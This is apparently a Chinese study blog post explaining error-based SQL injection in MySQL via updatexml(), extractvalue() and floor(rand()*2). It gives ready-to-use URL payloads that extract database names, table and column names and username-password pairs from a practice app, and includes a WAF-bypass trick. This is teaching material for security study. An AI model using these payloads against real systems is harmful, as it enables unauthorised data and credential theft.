---
title: SQL报错注入
categories:
  - 学习
tags:
  - SQL注入
abbrlink: bf58a956
---

**SQL注入分类：**

- 回显正常---> 联合查询` union select`

- 回显报错-->报错注入：
         
    1. `extractvalue()`
    2. `updatexml()`
    3. `floor(rand()\*2)`
    
- 盲注：

  布尔盲注
  
  时间盲注

## **报错注入（Error-Based Injection）**

### **核心原理**

- **适用条件**：页面无数据回显，但能返回数据库错误信息。
- **原理**：利用数据库函数执行时的参数校验漏洞，将查询结果嵌入到错误信息中。

### **`updatexml()` 函数报错注入**

#### **原理**

- **函数作用**：修改 XML 文档的指定节点内容。

- 语法

  ```sql
  updatexml(XML_document, XPath_string, new_value)
  ```
  
- **触发错误条件**：当 `XPath_string` 参数格式非法时（如包含特殊字符 `~`），函数抛出错误，并将错误信息包含非法内容。

#### **Payload 构造**

```sql
and updatexml(1, concat(0x7e, (查询语句), 0x7e), 1)
```

- 关键点

  - `0x7e` 是 `~` 的十六进制，用于分隔错误信息中的目标数据。
- 将查询结果拼接到第二个参数中，触发 XPath 语法错误。

#### **示例**

- **获取当前数据库名**：

  ```sql
  ?id=1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) --+
  ```

  - 报错信息

    ```
    XPATH syntax error: '~security~'
    ```

  

- **获取表名**：

  ```sql
  ?id=1' and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e), 1) --+
  ```
  
  - 报错信息

    ```
    XPATH syntax error: '~emails,referers,uagents,users~'
    ```

- **获取列名**：

  ```sql
  ?id=1' and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users'), 0x7e), 1) --+
  ```

  - 报错信息

    ```
    XPATH syntax error: '~id,username,password,ip,time,US'
    ```

- **获取具体数据**：

  ```sql
  ?id=1' and updatexml(1, concat(0x7e, (select group_concat(id,'-',username,'-',password) from users), 0x7e), 1) --+
  ```

  ```sql
  ?id=1' and updatexml(1, concat(0x7e, substr((select group_concat(id,'-',username,'-',password) from users),31,30), 0x7e), 1) --+
  ```

  - 报错信息

    ```
    XPATH syntax error: '~1-Dumb-Dumb,2-Angelina-I-kill-y'
    XPATH syntax error: '~you,3-Dummy-p@ssword,4-secure-~'
    ```

#### **注意事项**

- 结果长度限制：

  MySQL 报错信息默认最多显示 64 字节，超长结果需用`substr()`

  分段截取：

  ```sql
  and updatexml(1, concat(0x7e, substr((select password from users limit 1),1,30), 0x7e),1)
  ```

- 绕过 WAF：

  使用十六进制编码或注释混淆：

  ```sql
  and updatexml(1, concat(0x7e, (/*!50000SELECT*/ database()), 0x7e), 1)
  ```

#### **`concat()函数` **

**1. 作用**

将多个字符串或字段值连接成一个字符串。

**2. 语法**

```sql
concat(str1, str2, ..., strN)
```

- 支持任意数量的参数。
- 若任一参数为 `NULL`，则返回结果为 `NULL`（部分数据库如 MySQL 允许配置修改此行为）。

**3. 示例**

- 基本连接

  ```sql
  SELECT concat('Hello', ' ', 'World'); -- 输出 'Hello World'
  ```

- 字段拼接

  ```sql
  SELECT concat(username, ':', password) FROM users; 
  -- 输出 'admin:123456', 'user:qwerty'...
  ```

**4. 在 SQL 注入中的应用**

- 构造报错信息

  ```sql
  and updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)
  -- 报错信息中显示 '~database_name~'
  ```

- 绕过空格过滤

  使用 `concat()` 代替空格（部分 WAF 会过滤空格）：

  ```sql
  concat('sel','ect') -- 等效于 'select'
  ```

**对比总结**

| **函数**         | 用途                     | 输入           | 输出                   | 注入场景                   |
| :--------------- | :----------------------- | :------------- | :--------------------- | :------------------------- |
| `concat()`       | 横向拼接多个字符串       | 多列或多字符串 | 单行字符串             | 构造错误信息、绕过过滤     |
| `group_concat()` | 纵向合并多行数据为字符串 | 单列多行数据   | 单行字符串（含分隔符） | 批量提取数据、绕过逐行限制 |

#### **`substr()函数`**

**1.作用**

用于从字符串中提取子字符串。

**2. 基础语法**

```sql
substr(string, start_position [, length])
或substring(string, start_position [, length])
```

- 参数说明
  - `string`：要截取的原始字符串（可以是字段名、子查询结果或直接字符串）。
  - `start_position`：起始位置（**从 1 开始计数**）。
  - `length`（可选）：截取的长度。若省略，则截取到字符串末尾。

**3. 返回值**

- 返回从 `start_position` 开始、长度为 `length` 的子字符串。
- 若 `start_position` 为负数，则从字符串末尾倒数（部分数据库支持，如 MySQL）。
- 若 `start_position` 或 `length` 超出范围，返回空或部分有效字符。

**4. 示例**

**(1) 基本用法**

```sql
SELECT substr('Hello World', 7, 5);  -- 输出 'World'
```

- 从第 7 个字符（`W`）开始，截取 5 个字符。

**(2) 省略长度**

```sql
SELECT substr('Hello World', 7);     -- 输出 'World'
```

**(3) 负数起始位置（MySQL/MariaDB）**

```sql
SELECT substr('Hello World', -5, 5); -- 输出 'World'
```

- 从倒数第 5 个字符（`W`）开始截取。

**5. 在 SQL 注入中的应用**

在报错注入中，`substr()` 常用于分段提取数据（绕过报错信息长度限制）。

**示例 Payload**

```sql
?id=1' and updatexml(1, concat(0x7e, substr((select group_concat(username) from users),1,30), 0x7e),1) --+
```

- **作用**：从 `users` 表的 `username` 字段中提取前 30 个字符。

**6. 跨数据库差异**

| **数据库**        | 语法支持                                                     |
| :---------------- | :----------------------------------------------------------- |
| **MySQL/MariaDB** | 支持 `substr()` 和 `substring()`，负数起始位置有效。         |
| **PostgreSQL**    | 仅支持 `substring(string FROM start [FOR length])`，起始位置从 1 开始。 |
| **Oracle**        | 仅支持 `substr()`，起始位置从 1 开始。                       |
| **SQL Server**    | 使用 `substring()`，语法同标准 SQL。                         |

**7. 注意事项**

1. **起始位置从 1 开始**：
   若设置为 `0`，在 MySQL 中会返回空字符串，其他数据库可能报错。

2. **中文字符处理**：
   若字段包含多字节字符（如 UTF-8 中文），`substr()` 可能按字节截取而非字符，导致乱码。可使用 `substring()` 的字符模式（部分数据库支持）。

3. **结果长度限制**：
   在报错注入中，需确保截取长度不超过报错信息的显示限制（通常 64 字节）。

4. **子查询必须包裹括号**：

   ```sql
   substr((select ...), 1, 30)  -- 正确
   substr(select ..., 1, 30)    -- 错误
   ```

------

### **`extractvalue()` 函数报错注入**

#### **原理**

- **函数作用**：从 XML 文档中提取指定节点的值。

- 语法

  ```sql
  extractvalue(XML_document, XPath_string)
  ```
  
- **触发错误条件**：当 `XPath_string` 格式非法时，函数报错并返回非法内容。

#### **Payload 构造**

```sql
and extractvalue(1, concat(0x7e, (查询语句), 0x7e))
```

#### **示例**

- **获取当前用户**：

  ```sql
  ?id=1' and extractvalue(1, concat(0x7e, user(), 0x7e)) --+
  ```
  
  - 报错信息

    ```
    XPATH syntax error: '~root@localhost~'
    ```

- **获取字段名**：

  ```sql
  ?id=1' and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users'), 0x7e)) --+
  ```
  
  - 报错信息

    ```
    XPATH syntax error: '~id,username,password~'
    ```

#### **与 `updatexml()` 的区别**

- **参数数量**：`extractvalue()` 只需两个参数，`updatexml()` 需要三个。
- **错误信息位置**：`extractvalue()` 的报错信息通常更简洁，适合快速提取数据。

------

### **`floor(rand()\*2)` 重复值冲突报错**

#### **原理**

- **核心逻辑**：利用 `floor(rand()*2)` 在 `group by` 子句中的随机性，导致主键重复冲突。

- 关键步骤

  1. `floor(rand()*2)` 生成 0 或 1 的随机数。
2. 在聚合查询（如 `count()`）中，由于 `rand()` 的重复计算，可能生成重复的临时键值，触发 `Duplicate entry` 错误。

#### **Payload 构造**

```sql
and (select 1 from (select count(*), concat(0x7e, (查询语句), 0x7e, floor(rand()*2)) as x from information_schema.tables group by x) as a)
```

#### **示例**

- **获取数据库版本**：

  ```sql
  id=1' and (select 1 from (select count(*), concat(0x7e, version(), 0x7e, floor(rand()*2)) as x from information_schema.tables group by x) as a) --+
  ```
  
  - 报错信息

    ```
    Duplicate entry '~5.7.36~1' for key 'group_key'
    ```

- **获取表名**：

  ```sql
  ?id=1' and (select 1 from (select count(*), concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 1), 0x7e, floor(rand()*2)) as x from information_schema.tables group by x) as a) --+
  ```

#### **注意事项**

- **随机性要求**：可能需要多次执行才能触发报错。
- **结果长度限制**：同样受 64 字节限制，需分段截取。
- **适用场景**：适用于无 `updatexml()` 和 `extractvalue()` 权限的环境。

------

### **三种方法的对比总结**

| **方法**          | 优点                   | 缺点                 | 适用场景              |
| :---------------- | :--------------------- | :------------------- | :-------------------- |
| `updatexml()`     | 直接快速，错误信息清晰 | 结果长度受限         | 快速提取短数据        |
| `extractvalue()`  | 参数简单，错误信息简洁 | 同 `updatexml()`     | 同 `updatexml()`      |
| `floor(rand()*2)` | 不依赖 XML 函数权限    | 需多次尝试，构造复杂 | 无 XML 函数权限的环境 |